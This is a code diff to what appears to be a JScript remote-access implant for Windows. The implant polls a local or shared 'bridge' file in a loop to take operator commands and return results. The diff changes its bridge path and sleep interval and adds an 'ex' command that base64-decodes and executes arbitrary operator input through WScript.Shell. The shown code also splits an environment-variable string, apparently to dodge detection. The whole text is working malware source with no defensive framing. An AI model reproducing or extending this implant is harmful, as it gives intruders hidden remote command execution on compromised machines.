@@ -1,6 +1,6 @@
 //Define variables
-var home = 'C:\\users\\localadmin\\desktop\\bridge.txt' // UNC or local path. Send and receive data through this file
-var sleepytime = 3000 //in milliseconds
+var home = 'C:\\users\\kclark\\desktop\\test.txt' // UNC or local path. Send and receive data through this file
+var sleepytime = 6000 //in milliseconds
 
 var runner = new ActiveXObject("WScript.Shell")
 var temp = runner.ExpandEnvironmentStrings("%TE" +"MP%");
@@ -231,6 +231,11 @@ while(true)
             catch (e) {
               retval = "[-] Could not upload file: " + filename
             }
+          }
+
+          else if(cmnd.split(" ")[0] == "ex") {
+            runner.Exec(b64d(cmnd.split(" ")[1]))
+            retval = "[*] Exec'd cmnd... (no output)"
           }
 
           //credit to nate and 0sum
